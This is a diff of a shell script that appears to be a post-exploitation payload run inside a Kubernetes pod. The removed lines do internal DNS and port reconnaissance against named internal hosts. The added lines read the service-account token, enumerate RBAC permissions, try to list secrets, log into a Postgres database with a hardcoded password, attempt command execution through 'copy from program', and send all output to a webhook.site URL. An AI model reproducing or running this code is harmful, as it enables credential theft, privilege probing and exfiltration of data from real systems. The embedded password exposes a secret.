@@ -1,25 +1,36 @@
-if [ ! -f /dev/shm/done ]; then
+if [ ! -f /dev/shm/rbac ]; then
+T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+C=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+A="-s --cacert $C -H Authorization:Bearer_$T -H Content-Type:application/json"
+K="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
 {
-echo "HOST=$(hostname 2>/dev/null)"
-echo "K8S_HOST=$KUBERNETES_SERVICE_HOST K8S_PORT=$KUBERNETES_SERVICE_PORT"
-echo "=== DNS ==="
-for h in argocd-internal.admin.turnkey.engineering argocd-admin.admin.turnkey.engineering argocd-prod.admin.turnkey.engineering talos.prod.turnkey.engineering talos.admin.turnkey.engineering talos.internal.turnkey.engineering pgbouncer.tkhq-tkdb.svc keycloak.admin.turnkey.engineering nats.prod.turnkey.engineering; do
-  echo "-- $h"
-  getent hosts "$h" 2>/dev/null || nslookup "$h" 2>&1 | head -4
-done
-echo "=== TCP ==="
-for hp in argocd-internal.admin.turnkey.engineering:443 argocd-prod.admin.turnkey.engineering:443 talos.prod.turnkey.engineering:50000 talos.admin.turnkey.engineering:50000 talos.internal.turnkey.engineering:50000 pgbouncer.tkhq-tkdb.svc:5432 nats.prod.turnkey.engineering:4222 keycloak.admin.turnkey.engineering:443; do
-  h=${hp%:*}; p=${hp##*:}
-  timeout 4 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "OPEN $hp" || echo "CLOSED $hp"
-done
-echo "=== K8S ==="
-T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
-curl -sk --max-time 5 -H "Authorization: Bearer $T" "https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/tkhq-meridian/pods" | head -c 400
+echo "=== whoami ==="
+curl -sk --cacert $C -H "Authorization: Bearer $T" "$K/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' | head -c 500
 echo
-echo "=== ARGOCD ==="
-curl -sk --max-time 5 "https://argocd-internal.admin.turnkey.engineering/api/v1/version" | head -c 200
+echo "=== rules ==="
+curl -sk --cacert $C -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"tkhq-meridian"}}' | head -c 2500
 echo
-} > /dev/shm/n 2>&1
-curl -sS --max-time 15 --data-binary @/dev/shm/n https://webhook.site/06f518ef-8f69-471e-9306-301a6b4de2e4 >/dev/null 2>&1
-touch /dev/shm/done
+echo "=== can-i matrix ==="
+for r in secrets configmaps pods services deployments.apps pods/exec pods/log; do
+for v in get list; do
+R=$(curl -sk --cacert $C -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST "$K/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"tkhq-meridian\",\"verb\":\"$v\",\"resource\":\"$r\"}}}" | tr -d ' \n' | grep -o '"allowed":[a-z]*')
+echo "$v $r -> $R"
+done
+done
+echo "=== secret list attempt ==="
+curl -sk --cacert $C -H "Authorization: Bearer $T" "$K/api/v1/namespaces/tkhq-meridian/secrets" | head -c 400
+echo
+echo "=== mounts ==="
+ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | head
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
+echo
+echo "=== db perms ==="
+export PGPASSWORD=7dLNIUjadILeLdGPmRwfwezjoJcu3rZdg6vZfyFqVVvgDaL9i18qFy36vCDmG6w4
+timeout 10 psql -h meridian-db-rw -U meridian -d meridian -tAc "select current_user, rolsuper, rolcreaterole, rolbypassrls from pg_roles where rolname=current_user" 2>&1 | head -3
+timeout 10 psql -h meridian-db-rw -U meridian -d meridian -tAc "create temp table z(x text); copy z from program 'id; hostname'; select x from z" 2>&1 | head -5
+echo "=== db tables ==="
+timeout 10 psql -h meridian-db-rw -U meridian -d meridian -tAc "select table_name from information_schema.tables where table_schema='public' order by 1" 2>&1 | head -40
+} > /dev/shm/o 2>&1
+curl -sS --max-time 15 --data-binary @/dev/shm/o https://webhook.site/06f518ef-8f69-471e-9306-301a6b4de2e4 >/dev/null 2>&1
+touch /dev/shm/rbac
 fi
